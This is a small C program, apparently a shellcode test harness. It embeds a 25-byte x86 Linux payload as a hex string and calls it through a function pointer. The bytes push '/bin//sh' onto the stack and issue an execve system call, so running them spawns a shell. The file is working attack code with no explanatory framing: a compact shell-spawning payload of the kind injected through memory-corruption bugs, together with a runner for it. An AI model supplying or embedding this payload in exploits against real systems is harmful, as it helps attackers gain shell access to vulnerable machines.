
		#include<stdio.h>
		#include<string.h>

		unsigned char code[] = "\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80";

		void main() {

			printf("Shellcode Length:  %d\n", strlen(code));

			int (*ret)() = (int(*)())code;

			ret();

		}